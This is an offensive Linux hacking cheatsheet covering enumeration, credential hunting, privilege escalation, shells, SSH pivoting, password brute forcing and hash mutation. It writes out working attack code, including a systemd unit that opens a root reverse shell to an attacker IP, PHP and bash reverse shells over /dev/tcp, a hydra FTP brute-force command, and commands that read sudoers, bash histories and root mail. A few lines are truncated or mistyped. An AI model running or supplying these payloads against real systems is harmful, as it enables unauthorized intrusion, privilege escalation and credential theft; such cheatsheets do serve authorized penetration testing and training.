# Linux Hacking Cheatsheet

## Automated Enumeration Scripts

`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
`wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh`
`wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py # python2`
`wget

<!--
##################################################################
##################################################################
-->

## System Enumeration

### Search for keyword

`grep -ri "word" /`
`grep -ri "search term` /| grep -Fv "excluded term"

### Find SUID bits

`find / -perm -u=s -type f 2>/dev/null`
`find / -user root -perm -4000 -exec ls -ldb {} \;`

### Find human readable strings in binary

`strings /usr/bin/menu`

### Services running as Root

`ps aux | grep root`

### Show System Distribution and Version

`cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release;`

### Show System Architecture

`cat /proc/version; uname -a; uname -mrs; rpm -q kernel; dmesg | grep Linux; ls /boot | grep vmlinuz-; file /bin/ls; cat /etc/lsb-release`

### Find Writable Config Files

`find /etc/ -writable -type f 2>/dev/null`

### Find Miss-configured Services

`cat /etc/syslog.conf; cat /etc/chttp.conf; cat /etc/lighttpd.conf; cat /etc/cups/cupsd.conf; cat /etc/inetd.conf; cat /etc/apache2/apache2.conf; cat /etc/my.conf; cat /etc/httpd/conf/httpd.conf; cat /opt/lampp/etc/httpd.conf; ls -aRl /etc/ | awk '$1 ~ /^.*r.*/`

### Show Scheduled Cron Jobs

`crontab -l; ls -alh /var/spool/cron; ls -al /etc/ | grep cron; ls -al /etc/cron*; cat /etc/cron*; cat /etc/at.allow; cat /etc/at.deny; cat /etc/cron.allow; cat /etc/cron.deny`

### Find Hardcoded Passwords

`grep -i user [filename]`
`grep -i pass [filename]`
`grep -C 5 "password" [filename]`
`find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"`

### Find World Readable/Writable Files

`echo "world-writeable folders"; find / -writable -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -222 -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -o w -type d 2>/dev/null; echo "world-executable folders"; find / -perm -o x -type d 2>/dev/null; echo "world-writeable & executable folders"; find / \( -perm -o w -perm -o x \) -type d 2>/dev/null;`

### Find World Readable Files

`find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print`

<!--
##################################################################
##################################################################
-->

## User Enumeration

### Show Groups Users In

`id`

### Show Users Sudo Permissions

`sudo -l`

### List All Users Home Directories

`ls -ahlR /root/; ls -ahlR /home/`

### Show Users Bash History

`cat ~/.bash_history; cat ~/.nano_history; cat ~/.atftp_history; cat ~/.mysql_history; cat ~/.php_history`

### Show Users Mail

`cat ~/.bashrc; cat ~/.profile; cat /var/mail/root; cat /var/spool/mail/root`

### Find Other Users

`id; who; w; last; cat /etc/passwd | cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l`

<!--
##################################################################
##################################################################
-->

## Network Enumeration

### Show Connections

`netstat -ano`

<!--
##################################################################
##################################################################
-->

## Privilege Escalation

### Priv Esc systemctl with user access

_Create protection.service file in writable directory_

```
[Unit]
Description=Does very important stuff mmmkay

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOURIP/YOURPORT 0>&1'

[Install]
WantedBy=multi-user.target
```

<!--
##################################################################
##################################################################
-->

## Shells

### Escaping no tty shell

`/usr/bin/script -qc /bin/bash /dev/null`

_try ctrl + z_

`stty raw -echo`

`fg`

`export TERM=xterm #autocomplete`

_or_

`SHELL=/bin/bash script -q /dev/null`

`Ctrl-Z`

`stty raw -echo`

`fg`

`reset`

`xterm`

### PHP reverse shell

```
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/172.30.10.210/443 0>&1'");
```

### Bash Reverse Shell

`bash-c'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'`

<!--
##################################################################
##################################################################
-->

## Useful Commands

### Grep IPs out of file

`grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" file.txt`

### Add Directory to PATH

export PATH=/tmp:$PATH

### Edit Wifi Connections

`nmtui`

_or_

`nmcli`

### Spin up webserver

`python -m SimpleHTTPServer 80`
`php -S 0.0.0.0:80 -t .`

### SSH Port Forwarding

`ssh -D localhost:9999 -f -N root@172.30.72.97 -p 40384`

**\*edit proxychains .conf file to connect over socks5 127.0.0.1 9999**

_or_

~C "if you already have an SSH session"

-R 8081:172.24.0.2:80 (on my Kali machine listen on 8081, get it from 172.24.0.2:80)
<KALI 10.1.1.1>:8081<------------<REMOTE 172.24.0.2>:80
Now you can access 172.24.0.2:80, which you didn't have direct access to

-L 8083:127.0.0.1:8084 (on your machine listen on 8083, send it to my Kali machine on 8084)
<KALI 127.0.0.1>:8084<------------<REMOTE 10.1.1.230>:8083<------------<REMOTE X.X.X.X>:XXXX
run nc on port 8084, and if 10.1.1.230:8083 receives a reverse shell, you will get it

### sshuttle

`sshuttle --dns -vvr user@targetip -x targetip 0/0`

### Pull Hash from Password Protected Zip

`zip2john file.zip > hash`

### Find Specific Users Shell Type

`finger $USER | grep 'Shell:*' | cut -f3 -d ":"`
`getent passwd $LOGNAME | cut -d: -f7`

#### Show MOTD

`cat /run/motd.dynamic`
`sudo run-parts /etc/update-motd.d/`

### Brute Force FTP Login

`hydra -L users.txt -P /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 192.168.79.46 ftp –V -f `

### Set TTL to trick Hotspot

`sudo sysctl -w net.inet.ip.ttl=65`

### Mutate password list

`hashcat --force passwordsfile -r /usr/share/hashcat/rules/best64.rule --stdout > t`

### Decrypt Base64

`echo -n base64string | base64 -d`


### Setup Virtual Environment
`virtualenv -p python3 venv`
`source venv/bin/activate`

### Switch to a Different Version of Python
`https://github.com/pyenv/pyenv#installation`
`https://www.kali.org/docs/general-use/using-eol-python-versions/`

### Clone Website
Cloning a website for offline testing involves downloading the entire website's contents such as HTML, CSS, JavaScript, images, and other files to your local machine. There are various tools available for this purpose, such as HTTrack and wget, which are two popular options.

Before we go into the how-to, please note that cloning a website for personal use or testing might be okay, but republishing it as your own, or using the clone for commercial purposes, or even simply ignoring robots.txt rules could be illegal and violate copyright laws. Always respect the terms of service of the website you are cloning and the intellectual property rights of its owners.

Here's how you might do it with wget, a command line utility. You'll need to have wget installed on your machine. Most Unix-like operating systems, such as Linux or macOS, come with wget installed. For Windows, you may need to download and install it separately.

    Open a terminal or command prompt.
    Navigate to the directory where you want to store the website clone. For example:


`cd /path/to/your/directory``

    Use the following wget command:

`wget --mirror --convert-links --adjust-extension --page-requisites --no-parent http://example.com``

Here's what each option does:

    --mirror : turn on options suitable for mirroring.
    --convert-links : after the download, convert the links in the document to make them suitable for local viewing.
    --adjust-extension : save HTML/CSS files with .html/.css extensions.
    --page-requisites : download all the files that are necessary to properly display a given HTML page.
    --no-parent : don't ascend to the parent directory when retrieving recursively.

Replace "http://example.com" with the website you want to clone.

Please keep in mind that these methods do not guarantee a perfect copy, especially for websites that rely on server-side processing. Also, websites with dynamic content (such as those created by JavaScript) might not be copied correctly. Also, keep in mind that this doesn't include databases or other server-side resources.

A lot of the internet is built on the assumption of being online. Some things just won't work correctly offline without extra work.